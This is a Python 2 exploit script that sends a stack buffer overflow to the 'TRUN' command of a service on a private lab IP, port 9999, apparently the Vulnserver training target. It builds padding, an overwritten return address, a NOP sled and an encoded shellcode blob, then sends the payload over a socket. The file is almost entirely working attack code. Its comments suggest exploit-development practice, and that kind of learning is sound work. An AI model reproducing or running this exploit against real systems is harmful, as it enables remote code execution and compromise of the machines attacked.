#!/usr/lib/python

import socket 
import os 
import sys

host = '192.168.1.107'
port = 9999

buffer = ""
# buffer += "A" * 5011
# buffer += "pattern_from_metasploit"
buffer += "A" * 2003
#buffer += "B" * 4

# the address value we write in Endian format (in reverse)
buffer += "\x03\x12\x50\x62"

# add the padding or NOP because shell runs with encoder and it needs some space to run to decode properly
buffer += "\x90" * 10



# buffer += (byte_array)


buf =  b""
buf += b"\xb8\xf0\x46\xb0\x1f\xda\xd5\xd9\x74\x24\xf4\x5f\x33"
buf += b"\xc9\xb1\x52\x31\x47\x12\x03\x47\x12\x83\x1f\xba\x52"
buf += b"\xea\x23\xab\x11\x15\xdb\x2c\x76\x9f\x3e\x1d\xb6\xfb"
buf += b"\x4b\x0e\x06\x8f\x19\xa3\xed\xdd\x89\x30\x83\xc9\xbe"
buf += b"\xf1\x2e\x2c\xf1\x02\x02\x0c\x90\x80\x59\x41\x72\xb8"
buf += b"\x91\x94\x73\xfd\xcc\x55\x21\x56\x9a\xc8\xd5\xd3\xd6"
buf += b"\xd0\x5e\xaf\xf7\x50\x83\x78\xf9\x71\x12\xf2\xa0\x51"
buf += b"\x95\xd7\xd8\xdb\x8d\x34\xe4\x92\x26\x8e\x92\x24\xee"
buf += b"\xde\x5b\x8a\xcf\xee\xa9\xd2\x08\xc8\x51\xa1\x60\x2a"
buf += b"\xef\xb2\xb7\x50\x2b\x36\x23\xf2\xb8\xe0\x8f\x02\x6c"
buf += b"\x76\x44\x08\xd9\xfc\x02\x0d\xdc\xd1\x39\x29\x55\xd4"
buf += b"\xed\xbb\x2d\xf3\x29\xe7\xf6\x9a\x68\x4d\x58\xa2\x6a"
buf += b"\x2e\x05\x06\xe1\xc3\x52\x3b\xa8\x8b\x97\x76\x52\x4c"
buf += b"\xb0\x01\x21\x7e\x1f\xba\xad\x32\xe8\x64\x2a\x34\xc3"
buf += b"\xd1\xa4\xcb\xec\x21\xed\x0f\xb8\x71\x85\xa6\xc1\x19"
buf += b"\x55\x46\x14\x8d\x05\xe8\xc7\x6e\xf5\x48\xb8\x06\x1f"
buf += b"\x47\xe7\x37\x20\x8d\x80\xd2\xdb\x46\x6f\x8a\xe2\xfa"
buf += b"\x07\xc9\xe4\x13\x84\x44\x02\x79\x24\x01\x9d\x16\xdd"
buf += b"\x08\x55\x86\x22\x87\x10\x88\xa9\x24\xe5\x47\x5a\x40"
buf += b"\xf5\x30\xaa\x1f\xa7\x97\xb5\xb5\xcf\x74\x27\x52\x0f"
buf += b"\xf2\x54\xcd\x58\x53\xaa\x04\x0c\x49\x95\xbe\x32\x90"
buf += b"\x43\xf8\xf6\x4f\xb0\x07\xf7\x02\x8c\x23\xe7\xda\x0d"
buf += b"\x68\x53\xb3\x5b\x26\x0d\x75\x32\x88\xe7\x2f\xe9\x42"
buf += b"\x6f\xa9\xc1\x54\xe9\xb6\x0f\x23\x15\x06\xe6\x72\x2a"
buf += b"\xa7\x6e\x73\x53\xd5\x0e\x7c\x8e\x5d\x3e\x37\x92\xf4"
buf += b"\xd7\x9e\x47\x45\xba\x20\xb2\x8a\xc3\xa2\x36\x73\x30"
buf += b"\xba\x33\x76\x7c\x7c\xa8\x0a\xed\xe9\xce\xb9\x0e\x38"




buffer += buf

# same NOP here
buffer += "\x90" * (10005 - len(buffer))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

print s.recv(1024)

s.send("TRUN /.:/" + buffer)

print s.recv(1024)
s.close()